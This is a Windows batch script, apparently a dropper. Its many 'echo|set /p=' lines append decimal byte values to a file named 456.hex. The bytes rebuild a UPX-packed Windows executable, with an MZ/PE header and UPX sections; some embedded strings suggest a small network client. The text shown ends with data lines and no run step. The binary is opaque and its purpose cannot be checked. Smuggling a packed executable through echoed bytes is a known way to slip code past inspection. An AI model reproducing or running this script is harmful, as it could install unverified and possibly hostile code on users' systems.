@echo off
echo|set /p=>456.hex
echo|set /p=77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 >>456.hex
echo|set /p=169 69 122 226 237 36 20 177 237 36 20 177 237 36 20 177 23 7 84 177 239 36 20 177 237 36 21 177 160 36 20 177 23 7 13 177 230 36 20 177 122 7 81 177 236 36 20 177 55 7 8 177 249 36 20 177 23 7 41 177 236 36 20 177 82 105 99 104 237 36 20 177 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 3 0 37 133 125 59 0 0 0 0 0 0 0 0 224 0 15 1 11 1 7 0 0 32 0 0 >>456.hex
echo|set /p=0 16 0 0 0 96 0 0 64 138 0 0 0 112 0 0 0 144 0 0 0 0 0 1 0 16 0 0 0 2 0 0 5 0 1 0 5 0 1 0 4 0 0 0 0 0 0 0 0 160 0 0 0 16 0 0 0 0 0 0 3 0 0 128 0 0 4 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 100 148 0 0 100 1 0 0 0 144 0 0 100 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 85 80 88 48 0 0 0 0 0 96 0 0 0 16 0 0 0 0 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 128 0 0 224 >>456.hex
echo|set /p=85 80 88 49 0 0 0 0 0 32 0 0 0 112 0 0 0 28 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 224 46 114 115 114 99 0 0 0 0 16 0 0 0 144 0 0 0 6 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 46 57 49 0 85 80 88 33 13 9 2 8 101 135 113 140 199 112 130 46 55 100 0 0 54 26 0 0 0 70 0 0 38 1 0 97 >>456.hex
echo|set /p=239 6 138 144 0 45 6 116 102 116 112 229 237 47 55 0 117 100 112 117 116 0 103 101 3 45 115 0 247 243 223 154 111 98 35 110 101 116 97 115 99 105 105 111 99 116 29 75 115 233 58 23 105 3 116 119 43 0 114 247 205 152 51 50 0 255 206 29 0 1 226 3 127 173 251 91 32 0 0 37 48 50 88 32 23 79 91 94 0 73 110 223 151 127 123 6 127 85 110 107 110 111 119 110 115 105 122 101 135 105 131 125 236 238 109 101 111 25 98 108 107 17 98 97 100 32 11 32 >>456.hex
echo|set /p=192 254 123 255 114 101 99 101 105 118 101 100 95 23 111 112 99 111 100 22 251 183 255 94 19 199 32 112 97 99 107 161 32 108 101 110 103 116 104 43 173 181 219 127 83 111 114 114 121 44 32 119 192 110 39 21 199 78 219 183 189 181 105 24 7 111 32 121 105 33 75 108 209 107 253 219 182 253 32 110 117 109 32 103 75 97 219 114 27 104 97 110 32 101 120 112 182 54 108 183 89 116 87 117 110 10 89 74 116 176 45 89 251 41 98 36 171 135 110 131 127 238 79 198 164 64 84 70 >>456.hex
echo|set /p=84 80 37 169 3 78 66 49 198 7 249 135 48 107 37 133 125 59 1 46 112 100 98 210 248 189 251 7 85 139 236 129 236 0 29 51 192 80 104 7 141 141 46 223 186 127 67 81 80 255 117 24 16 8 24 255 21 28 16 141 133 187 44 91 247 22 21 20 2 16 12 8 232 45 237 255 255 127 17 5 201 194 20 0 131 236 28 83 85 86 87 139 216 139 3 106 4 93 3 221 163 112 66 48 111 219 111 255 139 51 133 246 15 132 150 2 64 106 3 191 152 17 16 89 97 243 166 117 >>456.hex
echo|set /p=125 223 94 251 14 199 5 196 64 12 142 40 235 7 131 37 13 0 251 147 156 156 44 105 148 20 199 68 36 32 140 14 223 246 96 157 7 36 50 13 131 100 11 0 24 128 239 238 126 51 113 133 192 139 53 224 160 139 61 228 5 116 33 106 2 91 107 223 220 104 124 24 169 215 131 196 12 28 172 34 64 219 238 182 183 64 13 214 89 137 50 28 63 5 131 76 7 255 55 32 71 200 216 43 120 24 123 32 205 201 24 25 116 8 33 35 239 22 25 100 20 20 192 168 1 162 182 219 >>456.hex
echo|set /p=204 217 139 248 13 154 155 36 52 104 112 57 247 167 251 54 214 21 89 89 117 10 204 16 235 27 104 108 23 98 159 251 108 255 51 24 15 133 105 21 28 2 233 223 223 109 206 68 85 131 124 48 117 31 131 195 4 139 232 21 117 156 109 120 195 13 85 123 26 164 163 116 103 235 35 6 25 45 182 253 52 119 116 11 133 201 99 80 32 46 165 217 238 110 158 139 233 55 131 59 0 94 10 141 15 255 194 238 40 80 87 28 25 137 174 133 219 117 19 87 255 53 173 104 204 243 109 195 >>456.hex
echo|set /p=17 39 123 2 233 178 5 144 104 104 96 207 156 29 254 39 222 131 248 241 37 16 35 194 195 237 253 224 102 137 67 2 161 110 51 191 92 135 240 177 53 118 183 203 210 116 110 15 95 57 174 117 34 9 236 181 159 187 240 21 40 26 219 125 86 64 45 70 175 112 182 25 18 235 56 214 60 34 37 216 96 15 194 106 0 31 124 43 87 43 214 57 194 207 76 200 28 19 190 28 227 133 211 108 134 237 16 235 50 116 123 3 28 36 219 53 187 77 44 52 85 4 64 83 48 39 18 50 >>456.hex
echo|set /p=153 177 216 141 70 90 117 104 20 223 57 176 108 176 111 84 139 198 235 23 80 21 23 119 188 125 195 215 117 95 94 93 91 8 28 194 4 213 48 85 51 24 200 246 227 237 57 45 160 86 116 65 22 108 100 155 109 71 20 80 153 229 20 139 13 84 250 183 93 192 54 139 28 26 102 37 0 96 102 61 143 253 150 12 182 69 86 105 23 187 63 246 111 193 221 190 37 27 112 116 9 139 163 32 97 168 161 6 251 88 123 248 59 197 117 61 86 118 252 9 23 117 30 104 32 56 218 238 >>456.hex
echo|set /p=59 30 255 179 200 22 141 67 72 80 83 31 2 220 170 65 150 102 27 136 9 164 117 84 36 96 58 130 240 57 107 60 87 147 81 56 76 63 30 254 151 117 29 161 24 212 160 111 112 48 210 199 184 219 240 31 160 168 16 122 12 104 156 159 21 140 165 132 63 190 16 129 89 254 12 117 57 120 23 158 200 150 189 147 163 137 108 216 139 45 255 111 250 185 144 76 22 24 252 62 126 102 139 115 40 102 131 238 4 141 120 4 166 238 119 255 15 191 198 51 201 59 131 224 58 15 148 193 >>456.hex
echo|set /p=1 5 200 186 137 68 51 109 61 254 235 62 15 190 7 78 71 22 170 21 230 6 253 55 195 70 123 10 200 139 3 80 235 24 106 13 235 20 216 222 128 180 15 13 63 14 27 182 213 150 187 240 230 161 179 116 64 102 232 127 189 61 144 240 206 108 239 117 135 25 207 148 145 8 100 131 61 102 59 180 237 31 85 13 205 84 25 152 195 9 187 176 89 36 230 14 9 113 55 18 34 184 133 65 236 104 59 54 51 79 179 210 223 214 158 37 218 52 219 219 102 75 233 4 127 201 116 49 >>456.hex
echo|set /p=220 241 179 165 165 207 247 86 221 53 131 192 12 87 136 221 182 195 108 92 156 102 59 198 88 17 57 133 130 253 206 246 237 117 180 87 140 160 83 17 218 168 182 0 146 217 88 40 96 24 15 54 4 211 96 170 4 160 210 72 112 59 115 0 146 133 238 122 186 8 6 78 22 97 79 254 208 14 107 99 176 27 245 7 41 3 104 164 100 112 255 30 24 216 87 248 176 253 15 141 7 46 246 43 173 194 18 63 110 235 144 118 35 11 86 78 216 253 243 125 63 219 16 10 130 12 31 220 >>456.hex
echo|set /p=48 104 24 70 242 189 115 84 71 29 82 104 33 94 3 246 102 218 248 53 205 118 64 182 131 48 195 81 102 6 142 13 206 196 142 139 131 146 238 211 27 251 116 18 104 25 150 91 46 184 235 3 12 243 192 7 90 155 64 22 113 96 192 151 130 60 225 125 60 108 139 203 58 254 0 193 40 185 39 104 164 16 197 3 64 144 134 164 16 58 7 53 38 132 71 186 195 59 199 55 24 117 37 36 26 216 189 73 104 83 35 34 13 179 11 145 237 223 126 195 196 136 14 194 112 131 198 4 >>456.hex
echo|set /p=51 219 131 255 105 108 252 118 251 8 198 6 10 70 78 235 55 12 2 117 5 128 38 230 241 77 63 204 214 24 119 12 233 116 40 21 117 111 79 223 182 9 38 13 37 70 71 235 15 19 7 212 136 6 95 222 253 199 187 235 4 70 67 59 157 124 124 179 235 19 139 142 246 64 12 32 240 56 146 217 204 178 80 1 29 143 152 252 224 171 30 98 41 95 193 0 245 141 29 58 31 113 224 106 148 218 120 40 181 144 141 56 19 248 169 137 3 3 203 216 35 128 30 94 187 31 239 217 >>456.hex
echo|set /p=163 140 29 203 255 181 127 242 86 52 125 226 108 180 16 47 124 50 22 133 193 22 146 244 80 244 164 249 135 191 32 220 224 116 61 133 100 192 86 253 71 24 222 39 147 76 198 235 43 5 27 35 181 129 32 203 88 119 69 85 182 160 157 112 224 89 180 255 86 150 119 16 228 105 177 28 1 5 1 70 131 127 131 123 247 254 1 185 170 146 116 5 185 168 6 32 8 153 247 254 80 81 86 238 182 236 7 72 104 29 47 179 24 94 78 251 100 113 67 29 81 83 86 238 29 142 104 224 >>456.hex
echo|set /p=94 39 204 118 160 104 105 156 104 28 134 45 100 182 17 10 24 45 36 166 131 207 38 238 45 139 69 12 101 3 32 116 62 227 188 189 65 100 4 211 131 123 56 224 137 69 252 214 126 188 43 178 30 5 246 235 6 28 9 170 26 40 214 118 161 131 240 219 221 18 43 28 255 53 154 22 202 46 24 11 171 213 106 35 8 158 62 137 239 63 204 106 40 104 176 150 14 40 51 69 20 234 127 139 111 102 129 56 77 90 29 139 72 60 3 200 129 57 80 69 55 219 238 111 75 18 15 183 >>456.hex
echo|set /p=65 24 61 11 165 116 31 6 2 5 137 125 192 11 55 252 228 235 39 131 185 132 55 14 118 242 48 57 185 248 62 240 108 143 66 131 121 116 15 226 232 143 149 192 227 135 111 219 155 228 43 252 114 128 139 131 13 120 204 240 89 56 219 6 124 243 124 13 56 41 50 178 61 178 8 13 120 52 64 56 120 236 95 12 0 163 128 66 161 27 23 57 254 207 124 90 46 190 117 12 43 229 32 17 186 191 7 251 224 22 104 60 139 56 201 16 161 48 63 69 224 182 155 217 182 141 2 80 >>456.hex
echo|set /p=249 44 9 220 80 3 216 242 253 237 104 212 102 232 16 30 208 104 52 53 48 187 189 173 29 139 35 121 236 26 91 117 220 2 11 174 135 101 216 212 49 250 7 253 137 141 9 11 237 117 204 57 241 100 86 57 210 133 47 220 158 240 45 52 236 139 154 9 137 77 200 243 246 66 111 124 69 10 23 195 139 101 84 117 200 131 45 133 135 231 216 0 46 248 16 252 219 77 136 118 224 191 18 157 38 97 195 204 255 37 187 5 220 166 204 200 244 164 224 3 0 4 151 141 204 215 31 73 >>456.hex
echo|set /p=114 120 30 100 161 19 29 239 143 0 228 100 137 37 7 97 16 14 182 221 212 221 141 3 43 224 83 36 69 248 137 112 80 6 118 219 156 225 252 199 231 0 217 248 130 77 240 47 145 237 27 207 13 89 200 91 201 81 195 103 132 208 184 193 135 136 82 84 36 90 139 2 210 255 182 197 119 158 102 59 6 117 45 86 2 170 13 139 66 4 43 70 4 173 203 118 235 247 216 27 252 235 28 18 23 20 87 215 174 165 111 234 141 126 8 58 141 114 8 243 167 102 192 17 184 209 219 104 >>456.hex
echo|set /p=12 199 8 134 59 64 36 250 199 198 231 209 70 8 57 54 229 177 139 70 36 28 200 242 109 123 6 80 12 213 16 44 169 114 89 219 11 59 32 17 52 100 153 109 67 103 172 218 215 89 34 64 254 239 212 141 10 86 3 95 47 103 141 80 1 138 8 64 132 71 118 244 141 132 249 43 194 64 3 176 16 116 20 216 255 155 218 139 76 28 152 43 241 138 17 136 20 14 65 132 210 117 246 51 188 55 208 56 8 131 124 172 52 72 117 96 229 109 179 45 109 189 6 87 3 107 88 124 >>456.hex
echo|set /p=18 10 107 228 182 237 5 127 13 198 102 111 2 107 120 6 217 222 99 95 12 6 11 6 235 47 48 42 92 96 102 11 152 22 65 192 59 215 206 170 27 166 8 244 4 122 116 185 82 83 1 56 72 87 209 12 35 91 146 91 226 252 251 183 84 116 57 118 172 227 22 161 216 64 137 27 161 220 10 0 252 102 142 245 70 93 24 190 208 73 190 200 49 60 88 247 202 18 132 121 80 72 86 106 17 109 146 56 72 30 106 18 39 28 56 180 195 27 110 223 142 169 234 83 139 29 144 222 >>456.hex
echo|set /p=15 11 124 131 11 233 16 126 150 16 95 51 246 5 126 24 129 246 141 36 26 8 15 182 4 200 120 131 159 192 9 93 221 104 192 156 0 74 70 59 247 214 176 183 221 124 220 49 127 30 94 94 43 247 37 125 215 85 51 198 188 231 184 78 101 231 74 118 58 126 109 44 41 91 77 190 48 215 180 12 183 100 183 134 137 117 107 46 94 55 26 211 79 216 182 147 117 47 215 16 106 10 17 131 56 0 6 40 52 27 213 143 95 91 50 228 15 28 235 13 51 86 104 152 5 225 28 6 >>456.hex
echo|set /p=246 116 55 222 14 219 113 102 93 20 84 6 24 141 86 164 199 6 190 135 23 110 30 43 208 252 136 12 2 255 246 22 72 125 97 89 54 12 16 210 83 106 1 43 193 86 129 27 118 11 255 5 64 15 94 98 139 93 8 89 167 223 190 173 87 128 51 82 183 153 126 24 131 187 212 5 198 239 29 218 116 15 43 131 29 45 209 86 130 17 216 21 56 95 91 229 137 255 182 253 147 191 25 151 70 87 83 200 59 28 131 190 2 177 128 153 19 33 63 69 142 108 112 233 137 94 135 126 >>456.hex
echo|set /p=20 196 4 78 32 171 107 250 5 43 137 78 24 195 233 185 204 217 131 72 207 194 45 71 153 110 240 80 40 16 5 214 58 250 161 60 182 125 8 1 50 70 90 93 248 27 191 241 8 124 4 71 235 34 209 102 32 75 32 106 30 89 59 193 43 181 194 86 178 65 32 196 87 211 88 131 173 217 65 134 17 143 64 162 201 55 30 204 112 15 104 240 132 255 5 89 109 148 5 245 93 8 14 67 142 29 71 42 45 21 11 131 60 89 116 185 127 227 111 14 139 251 243 171 131 99 158 64 >>456.hex
echo|set /p=137 67 4 137 131 216 61 217 12 219 246 188 42 27 28 16 52 200 5 56 108 91 177 101 24 60 22 180 12 16 64 246 255 127 161 71 200 139 209 193 233 2 141 123 72 243 165 139 202 131 225 3 243 164 61 210 129 119 132 0 179 204 67 139 18 111 163 145 131 144 155 240 80 14 143 44 188 131 26 182 137 3 117 35 110 216 11 106 19 7 51 219 100 149 83 177 172 157 9 104 247 173 48 132 158 242 99 110 16 117 25 57 152 108 124 75 190 50 16 41 49 12 77 83 163 208 10 90 >>456.hex
echo|set /p=198 224 14 105 176 112 110 124 8 43 214 138 14 8 50 70 145 80 155 155 172 143 244 139 199 141 112 28 198 11 148 28 192 154 48 218 3 254 46 52 199 64 109 48 254 220 219 15 137 85 12 70 43 198 183 110 240 221 131 163 76 19 150 141 124 7 40 68 14 39 53 188 221 28 60 6 32 12 184 0 233 249 220 0 241 223 246 226 5 105 93 32 232 125 20 116 104 185 13 102 155 225 185 179 155 193 33 59 220 248 108 205 240 17 15 7 244 79 4 246 131 199 152 90 3 10 24 132 >>456.hex
echo|set /p=112 101 123 107 141 101 183 179 215 14 68 1 9 97 173 69 192 156 139 23 208 22 53 250 190 109 130 65 23 20 137 139 232 82 248 92 223 246 197 182 19 65 117 36 21 11 20 228 137 75 65 182 99 237 32 235 98 114 10 67 32 117 232 184 36 36 144 236 29 115 185 144 48 51 32 117 53 115 133 99 207 174 101 116 199 131 1 120 65 57 123 105 139 141 70 120 175 40 199 31 147 246 219 238 173 131 52 8 190 224 97 165 102 1 199 64 6 48 0 44 24 55 186 2 19 91 51 117 >>456.hex
echo|set /p=252 178 196 161 149 35 228 97 228 184 81 218 200 251 129 87 39 108 70 12 199 169 109 71 240 59 195 9 36 79 5 106 252 160 68 3 16 11 156 194 36 202 248 179 19 128 30 44 117 234 57 158 15 193 29 165 83 173 86 20 18 245 83 106 223 145 233 111 33 97 139 71 48 128 36 137 136 134 171 55 232 2 128 62 7 139 33 92 229 89 29 29 240 134 29 52 178 208 237 58 31 8 86 91 192 8 176 117 216 117 88 160 39 59 135 178 142 148 193 129 48 242 218 135 198 137 141 102 >>456.hex
echo|set /p=192 94 162 164 220 104 104 232 71 17 128 21 122 96 36 235 217 186 30 118 192 48 203 19 6 105 235 186 83 26 183 40 67 76 162 116 27 48 21 42 131 29 125 105 198 251 140 149 89 202 190 44 71 119 91 214 214 161 29 79 104 248 221 205 183 118 208 117 10 51 71 27 48 223 165 38 76 140 0 12 91 156 95 22 73 55 211 165 56 37 78 12 14 9 72 2 18 161 245 8 173 63 136 131 102 28 43 120 57 119 6 95 79 4 159 128 75 61 219 207 218 26 74 57 0 183 221 5 >>456.hex
echo|set /p=168 18 5 219 67 223 135 90 143 70 29 162 4 156 35 19 120 164 93 8 3 128 80 168 255 118 44 17 54 68 171 175 20 113 127 22 173 23 144 106 16 139 5 26 208 140 17 20 120 205 21 163 76 82 48 144 44 124 44 8 26 7 94 131 251 2 251 48 123 27 112 44 111 92 36 153 59 158 203 231 118 245 38 112 54 1 72 49 52 14 126 185 237 47 120 33 86 57 86 8 31 158 37 104 213 104 177 211 7 152 114 147 45 74 180 55 252 79 2 59 223 234 143 44 219 143 219 6 >>456.hex
echo|set /p=0 101 57 150 116 117 6 13 5 120 199 79 55 29 44 130 74 139 134 12 199 70 8 141 225 109 193 182 15 32 61 74 143 162 2 15 219 88 108 137 53 74 200 106 249 81 88 21 182 28 252 255 59 203 117 72 102 149 180 65 61 19 59 224 8 148 17 223 236 225 254 138 134 147 12 70 134 129 4 104 148 40 66 151 177 99 252 24 191 119 59 116 150 159 27 249 118 187 21 235 108 86 134 169 55 150 17 106 78 70 220 98 71 29 106 24 5 104 92 138 243 216 231 39 59 189 199 125 >>456.hex
echo|set /p=141 158 15 199 192 109 67 132 113 55 147 21 59 8 177 81 88 186 125 23 35 2 126 56 34 82 194 215 104 247 43 52 26 22 60 59 22 128 229 131 10 145 223 225 5 83 57 22 17 5 139 222 128 253 4 115 13 83 106 21 114 36 44 195 165 151 29 154 46 235 92 249 235 90 30 99 107 176 135 63 26 174 65 48 4 17 6 43 180 108 23 58 2 25 16 241 12 216 47 123 106 22 84 16 4 141 73 179 37 13 87 158 156 224 200 57 78 205 188 32 18 104 176 238 73 15 116 12 >>456.hex
echo|set /p=12 4 32 64 219 214 216 201 47 106 3 216 113 105 133 31 20 181 104 46 71 28 25 5 86 204 104 45 182 6 40 240 168 76 183 76 181 58 122 176 86 87 118 29 231 90 198 51 236 102 65 238 125 191 216 214 10 5 47 41 105 120 86 117 137 147 195 116 32 32 253 4 81 123 16 105 171 36 221 8 20 243 75 49 161 46 92 136 131 93 183 89 40 66 225 238 39 41 162 76 182 221 61 49 153 53 43 139 72 16 61 209 129 19 38 54 241 112 24 87 15 187 64 194 82 34 209 160 >>456.hex
echo|set /p=9 19 139 62 22 222 155 217 238 32 80 137 10 55 80 81 139 195 91 84 27 77 182 247 253 3 78 100 61 191 197 91 162 192 64 8 202 66 255 114 27 23 56 245 28 12 184 6 128 63 159 247 131 119 181 104 234 157 52 128 249 47 117 76 77 102 91 120 240 128 56 153 241 57 212 34 244 112 166 11 195 104 176 113 67 208 14 187 192 129 101 131 98 43 200 68 48 30 106 88 52 64 91 204 20 127 131 191 80 23 60 203 235 6 138 7 136 73 71 59 254 114 246 128 230 110 219 133 >>456.hex
echo|set /p=33 170 77 244 198 138 15 132 192 53 188 43 209 253 214 251 130 79 138 79 1 71 68 248 15 217 23 177 88 183 139 242 212 200 209 197 113 65 192 221 130 241 45 12 84 111 93 186 112 129 254 202 235 39 22 138 6 230 255 213 159 160 137 214 211 13 193 216 44 176 235 14 183 218 22 110 22 60 92 53 60 193 3 47 1 70 219 8 187 253 56 30 117 213 56 31 217 116 37 48 249 62 123 61 124 183 59 237 136 30 42 219 235 93 165 45 208 112 24 97 195 29 60 243 147 2 62 32 >>456.hex
echo|set /p=18 52 183 56 19 224 11 226 219 198 47 65 28 1 60 8 41 89 141 125 196 137 82 46 222 220 137 117 200 181 164 37 226 245 55 132 48 137 77 196 199 69 204 2 35 29 150 220 96 151 63 228 104 184 60 36 20 120 99 219 196 25 82 238 31 190 196 194 5 251 252 83 57 62 117 10 243 64 24 133 8 46 26 92 114 253 163 54 135 11 182 252 83 248 172 2 140 60 118 230 110 79 116 44 63 248 80 33 21 64 69 108 92 26 59 124 23 50 24 51 73 2 19 14 238 197 104 154 >>456.hex
echo|set /p=111 19 88 12 64 99 156 106 156 68 6 0 39 4 88 185 96 66 205 104 66 40 192 82 231 144 1 182 86 203 135 139 9 28 174 166 212 44 160 235 14 92 89 228 193 137 189 116 50 137 177 176 41 215 67 5 228 8 88 26 244 225 183 84 201 25 138 9 133 19 80 81 20 174 103 100 99 248 201 96 127 60 49 5 169 179 171 252 67 116 255 6 161 142 237 179 159 72 85 252 89 20 207 217 239 209 25 29 239 181 33 9 203 219 77 202 189 229 187 25 17 91 170 24 37 185 162 236 >>456.hex
echo|set /p=157 28 21 196 89 45 69 218 146 179 83 102 108 69 206 172 118 104 192 246 81 81 119 16 141 44 49 1 165 237 189 131 55 52 53 126 46 184 25 213 236 9 9 166 173 201 195 13 93 70 3 192 218 86 168 240 154 153 205 117 170 252 2 36 48 12 217 154 51 124 197 14 4 200 13 32 195 8 90 163 30 237 198 162 55 111 228 0 214 81 45 181 104 8 99 98 147 16 173 101 117 168 184 65 178 238 244 60 175 2 204 0 52 51 246 44 151 196 200 5 36 19 97 69 132 0 178 90 >>456.hex
echo|set /p=88 164 170 42 248 131 28 69 5 1 1 108 20 21 32 3 166 25 130 168 2 1 101 179 108 154 26 28 16 39 36 40 9 174 251 255 187 68 25 37 0 49 0 160 0 58 0 32 0 84 0 76 0 79 1 75 11 111 230 255 187 97 15 114 0 101 0 110 0 118 0 111 0 121 0 233 41 50 0 33 178 185 223 220 0 100 3 9 48 0 13 0 10 77 67 52 103 238 115 19 69 53 55 117 5 81 73 232 238 44 97 57 53 48 51 201 0 99 185 235 186 165 28 101 5 32 25 117 >>456.hex
echo|set /p=111 115 0 111 205 129 185 174 100 123 103 23 99 56 68 115 55 214 117 131 108 27 105 47 39 161 116 0 116 235 154 238 189 5 19 31 112 115 1 233 57 88 215 252 5 55 116 0 95 111 1 107 215 154 45 97 83 49 157 55 64 76 110 172 107 198 85 114 115 9 97 161 101 11 110 172 235 186 116 7 104 59 114 11 45 27 114 75 57 168 201 186 105 199 101 63 84 97 23 107 54 211 35 117 173 110 234 165 13 94 247 186 179 163 32 27 110 243 7 112 67 194 115 77 247 17 171 105 >>456.hex
echo|set /p=105 21 221 69 132 132 110 118 46 85 159 1 93 8 99 99 39 5 108 221 99 49 105 65 100 77 247 189 25 187 116 29 98 101 17 72 120 103 179 123 179 101 57 103 117 239 173 108 108 99 55 39 97 116 9 236 176 236 19 77 141 101 176 230 42 123 23 107 72 80 35 227 155 224 6 32 197 211 15 105 11 176 195 140 217 15 97 173 71 222 115 159 153 148 11 65 125 69 79 54 178 183 18 185 1 33 161 231 186 179 1 41 82 9 100 123 23 132 203 2 194 99 87 1 68 11 38 227 >>456.hex
echo|set /p=177 108 233 245 3 1 36 198 182 129 225 147 87 11 109 213 115 194 6 108 192 185 40 35 108 37 100 115 205 150 39 92 73 25 173 111 198 144 48 97 105 109 255 117 67 77 54 227 75 167 98 19 155 99 60 110 214 141 191 110 11 120 203 93 96 150 180 189 100 231 93 63 116 139 180 44 25 51 215 7 203 133 140 159 150 5 113 106 0 224 185 2 100 147 180 19 160 73 72 187 100 18 198 30 149 113 19 116 227 116 72 103 1 27 80 27 147 44 141 235 186 110 214 244 3 123 116 73 >>456.hex
echo|set /p=97 71 103 83 194 150 125 5 121 44 223 35 153 236 49 27 51 219 97 115 112 55 105 214 161 67 43 101 255 161 135 231 70 186 19 99 116 209 125 85 108 140 110 132 97 13 99 225 109 113 120 45 124 239 148 108 116 51 159 117 57 232 201 9 201 102 133 109 43 80 210 35 73 19 233 103 149 99 27 214 74 24 215 45 79 119 72 129 100 76 31 112 79 38 129 217 132 81 85 73 109 234 222 87 194 77 23 82 223 31 112 82 0 97 194 103 39 181 193 172 155 164 111 155 114 65 46 21 >>456.hex
echo|set /p=76 53 32 112 70 108 103 37 85 61 125 102 47 149 13 144 107 89 195 108 89 221 246 19 11 112 45 114 255 127 128 165 178 41 67 55 143 112 32 37 112 64 19 179 150 181 144 150 45 41 163 27 10 225 16 135 168 59 97 75 99 31 73 26 99 15 121 109 169 111 226 45 41 9 187 223 233 34 251 78 75 9 187 233 78 51 64 22 6 88 229 119 160 64 56 189 33 105 15 219 135 122 203 154 161 96 77 57 5 78 114 11 73 201 131 102 15 223 39 123 122 17 198 57 39 153 89 147 >>456.hex
echo|set /p=102 3 28 22 33 172 233 143 199 72 205 117 221 132 116 51 116 63 47 251 107 203 66 18 179 112 21 237 79 203 2 22 79 131 117 115 71 129 157 111 89 155 151 50 53 72 154 144 45 55 100 105 185 189 55 155 21 3 9 5 221 206 34 73 15 75 105 197 15 108 4 216 89 192 117 101 112 99 38 76 54 194 39 53 114 101 100 99 66 15 6 200 111 88 227 233 200 98 66 19 108 57 43 149 193 123 95 11 109 101 21 181 32 156 220 32 15 160 6 84 255 75 217 128 48 232 19 115 >>456.hex
echo|set /p=165 113 18 120 176 13 239 117 165 157 233 155 145 108 118 29 227 157 100 85 177 111 9 37 5 51 116 107 111 217 195 123 53 145 35 117 19 119 116 91 202 120 147 35 163 70 3 80 168 155 205 102 105 181 17 27 91 247 130 209 230 65 39 93 81 97 19 110 115 93 215 71 111 84 9 124 3 37 85 11 98 103 207 124 33 115 141 85 91 205 37 187 164 247 49 171 59 93 101 210 64 54 178 93 32 32 1 83 33 0 233 50 18 81 109 103 16 206 224 17 39 237 103 113 78 76 198 108 >>456.hex
echo|set /p=98 139 55 40 9 251 200 116 51 93 107 97 233 108 113 73 172 178 153 159 1 105 45 59 140 117 41 57 69 163 157 33 133 49 145 127 44 175 55 32 51 23 54 213 233 151 47 97 39 48 189 114 19 169 210 208 45 161 85 17 19 122 89 99 182 178 9 67 112 207 135 165 44 5 54 97 223 145 227 179 109 37 44 13 17 46 75 154 8 99 25 107 21 39 210 75 72 203 201 239 195 31 176 25 203 70 105 201 181 241 90 32 173 191 17 37 204 104 129 221 157 209 164 101 75 98 145 167 >>456.hex
echo|set /p=181 43 16 38 173 235 83 65 216 72 122 137 119 127 156 150 176 132 39 17 207 3 192 22 36 17 135 4 194 27 88 239 85 9 37 172 2 97 141 17 7 87 182 176 215 1 73 21 29 33 37 163 165 211 224 65 54 11 33 71 103 195 16 182 141 176 103 29 249 83 4 152 45 176 131 105 219 175 222 97 145 65 95 53 31 33 146 245 94 121 251 105 127 48 91 22 33 33 169 39 48 169 97 147 169 119 111 130 75 128 73 207 99 92 9 150 196 74 179 193 179 12 8 133 196 197 125 108 >>456.hex
echo|set /p=176 9 155 44 199 119 81 101 201 66 32 93 172 91 104 133 197 44 30 237 118 93 81 35 144 45 88 163 84 98 103 33 176 117 229 231 112 147 0 210 205 248 213 95 167 233 115 222 74 226 171 159 84 15 33 50 154 144 12 237 3 193 20 47 100 192 51 83 155 197 140 150 21 89 239 205 129 140 125 192 145 44 65 52 30 230 48 55 47 3 187 28 183 88 82 12 16 149 155 196 140 134 144 197 97 133 84 194 1 146 149 235 189 88 201 25 47 57 137 108 204 30 102 66 119 100 227 187 >>456.hex
